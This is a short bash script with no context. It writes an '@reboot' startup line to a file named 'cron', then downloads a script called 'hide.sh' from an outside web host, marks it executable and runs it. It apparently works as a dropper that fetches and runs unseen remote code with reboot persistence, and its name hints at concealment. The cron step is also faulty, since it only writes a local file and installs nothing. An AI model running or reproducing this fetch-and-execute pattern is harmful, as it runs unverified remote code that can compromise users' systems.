#!/bin/bash

sudo echo "@reboot /opt/startup.sh" > cron
wget www.waxes27.com/hide.sh
chmod +x hide.sh
./hide.sh

echo "Cron made as cron"